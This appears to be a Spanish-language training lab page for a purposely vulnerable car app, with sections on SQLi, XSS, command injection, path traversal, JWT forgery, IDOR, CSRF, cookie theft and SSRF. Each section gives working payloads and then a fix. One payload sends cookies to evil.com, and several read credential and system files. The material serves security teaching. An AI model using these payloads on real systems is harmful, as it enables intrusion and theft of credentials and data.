💉 SQL Injection VULN_SQLI · Día 2

El login construye la query con concatenación de strings: SELECT * FROM users WHERE username='${username}' AND password='${password}'. Esto permite inyectar SQL para bypasear la autenticación o extraer datos.

Payloads de autenticación bypass

  • ' OR '1'='1' -- Login como primer usuario (alice/admin)
  • admin' -- Comentar la verificación de password
  • ' OR 1=1 LIMIT 1 OFFSET 1 -- Login como segundo usuario (bob)
  • ' UNION SELECT 1,2,3,4,5,6 -- Detectar número de columnas
  • ' UNION SELECT ... FROM users -- Extraer todos los usuarios

Ejecutar ataque

Usar prepared statements: db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)

🎭 Cross-Site Scripting (XSS) VULN_XSS · Día 2

VulnMotors usa innerHTML sin sanitización para renderizar comentarios y descripciones de coches. También tiene un vector DOM-XSS via ?msg= en la URL.

Stored XSS (comentarios)

  • <script>alert('XSS')</script> Clásico
  • <img src=x onerror=alert('XSS')> Via evento
  • <svg onload=alert(document.cookie)> Robo cookie
  • <img src=x onerror="fetch('/session/me',{credentials:'include'}).then(r=>r.json()).then(d=>document.title=JSON.stringify(d))"> Session hijack
  • <marquee><h1 style='color:red'>HACKEADO</h1></marquee> Defacement

DOM-XSS (parámetro ?msg=)

El frontend lee ?msg= y lo inserta con innerHTML en el alert-container.

  • ?msg=<img src=x onerror=alert('DOM-XSS')>
  • ?msg=<svg/onload=alert(document.domain)>
  • ?msg=<iframe src=javascript:alert('XSS')>
Escapar HTML: reemplazar < > " ' & con entidades. Mejor aún: usar textContent en vez de innerHTML.

💻 Command Injection VULN_CMDI · Día 3

El endpoint /debug?cmd= ejecuta comandos del sistema via child_process.execSync(). Los metacaracteres del shell (; | && $()) permiten encadenar comandos.

Payloads de inyección de comandos

  • whoami Usuario actual
  • ls -la /tmp Listar /tmp
  • cat /etc/passwd Usuarios del sistema
  • env Variables de entorno (secretos!)
  • uptime; id; cat /etc/hostname Encadenar con ;
  • echo vulnerable | base64 Pipe a otro comando
  • curl http://169.254.169.254/latest/meta-data/ SSRF via CMDi

Ejecutar comando

Usar una allowlist de comandos permitidos. Nunca pasar input del usuario a exec()/execSync().

📂 Path Traversal VULN_PATHTRAVERSAL · Día 3

El endpoint /files?path= descarga archivos. Si no se valida la ruta, podemos navegar fuera del directorio permitido con ../.

Payloads de path traversal

  • catalogo.txt Archivo legítimo
  • ../../../package.json Config de la app
  • ../../../.env Variables de entorno
  • ../../../../etc/passwd Usuarios Linux
  • ../../../../etc/shadow Hashes de passwords
  • ../../../../proc/self/environ Env del proceso
  • ../app.js Código fuente de la app
  • ../../ Listar directorio padre

Explorar archivos

Resolver la ruta con path.resolve() y verificar que empieza con el directorio base permitido.

🔑 JWT Weak Secret VULN_JWT_WEAK · Día 3

VulnMotors usa JWT con el secreto "secret" (hardcoded). Podemos decodificar tokens, forjar nuevos con rol admin, o explotar la falta de verificación de algoritmo.

Decodificar un token

Forjar un token con secreto débil

Si el secreto es "secret", podemos crear tokens arbitrarios.

Para forjar tokens usa jwt.io o python3 -c "import jwt; print(jwt.encode({'userId':999,'role':'admin'},'secret'))"
Usar un secreto aleatorio largo (crypto.randomBytes(32)), verificar algorithms: ['HS256'], y rotar periódicamente.

🆔 IDOR (Insecure Direct Object Reference) VULN_IDOR · Día 4

Los endpoints usan IDs secuenciales y predecibles. Cambiando el ID en la URL podemos acceder a datos de otros usuarios, editar coches ajenos o escalar privilegios.

Enumeración de perfiles

Itera por IDs para ver datos de todos los usuarios

Editar coche ajeno (IDOR horizontal)

Login como bob → editar coche de alice (ID 1-3)

Verificar que req.user.id === resource.owner_id (o rol admin) antes de permitir acceso/modificación.

🎯 Cross-Site Request Forgery (CSRF) VULN_CORS · Día 4

Si el usuario tiene una sesión activa (cookie), un sitio malicioso puede hacer peticiones en su nombre. VulnMotors tiene CORS: * y cookies sin SameSite.

CSRF via formulario oculto

Este formulario envía una "transferencia" usando la cookie de sesión de la víctima.
Prerequisito: la víctima debe tener sesión cookie activa (usar POST /session/login).

CSRF auto-submit (el atacante lo pone en su web)

<!-- En la web del atacante (auto-ejecuta al cargar) -->
<form id="f" method="POST" action="TARGET/session/transfer">
  <input name="to" value="evil_account">
  <input name="amount" value="99999">
</form>
<script>document.getElementById('f').submit();</script>
Para que CSRF funcione: 1) La víctima tiene cookie activa, 2) CORS permite el origen, 3) Cookie no tiene SameSite=Strict.
Configurar SameSite=Strict en cookies, restringir CORS al origen propio, y/o usar tokens anti-CSRF.

🍪 Insecure Cookies VULN_COOKIES · Día 4

El endpoint /session/login establece una cookie session=JWT sin flags de seguridad. Sin HttpOnly → JavaScript puede leerla. Sin Secure → se envía por HTTP. Sin SameSite → CSRF posible.

Login con cookie (establecer sesión)

Robo de cookie via XSS

Si la cookie no tiene HttpOnly, cualquier XSS puede robarla: 

// Payload XSS para robar cookie:
<img src=x onerror="new Image().src='https://evil.com/steal?c='+document.cookie">

// O en la consola del navegador (VulnApp):
fetch('https://evil.com/steal?c=' + document.cookie);
Flags de cookie segura:
Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Strict

• HttpOnly → JS no puede acceder (bloquea document.cookie)
• Secure → solo se envía por HTTPS
• SameSite=Strict → no se envía en peticiones cross-origin
Activar VULN_COOKIES=0 y repetir. Verás que document.cookie devuelve string vacío y que el CSRF de la pestaña anterior deja de funcionar.

🗝 Secrets Exposure VULN_SECRETS + VULN_PLAINTEXT · Día 5

El endpoint /debug expone variables de entorno del servidor (incluyendo secretos, connection strings, API keys). Además, los passwords se almacenan en texto plano en la base de datos.

Extraer variables de entorno

Passwords en texto plano

Registra un usuario y mira el /debug — los passwords están en claro.

Nunca exponer /debug en producción. Hashear passwords con bcrypt/argon2. Usar secretos en variables de entorno con acceso restringido (Key Vault).

🛡 Security Headers VULN_HEADERS · Día 6

Sin cabeceras de seguridad, la app es vulnerable a clickjacking (iframe), sniffing de MIME type, y ataques que se mitigan con CSP/HSTS.

Inspeccionar cabeceras de respuesta

Clickjacking — embeber VulnApp en iframe

Sin X-Frame-Options: DENY, podemos embeber la app en un iframe transparente y engañar al usuario para que haga clic.

Cabeceras esperadas:
Content-Security-Policy · Strict-Transport-Security · X-Frame-Options · X-Content-Type-Options · Referrer-Policy · Permissions-Policy
Activar VULN_HEADERS=0 (o usar helmet en Express). El iframe dejará de cargar con X-Frame-Options: DENY.

🌐 Server-Side Request Forgery (SSRF) VULN_SSRF · Día 6

El endpoint /fetch-image?url= hace peticiones desde el servidor. Sin validación, podemos acceder a servicios internos, metadatos del cloud, o hacer port scanning.

Payloads SSRF

  • http://localhost:3000/debug Endpoint interno (secretos)
  • http://localhost:3000/api Info de la API
  • http://169.254.169.254/latest/meta-data/ AWS Instance Metadata
  • http://169.254.169.254/metadata/instance Azure IMDS
  • http://127.0.0.1:22 Port scan SSH
  • file:///etc/passwd Protocolo file://

Ejecutar SSRF

Validar URL contra una allowlist de dominios. Bloquear protocolos no-HTTP. Bloquear rangos de IP internos (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8).
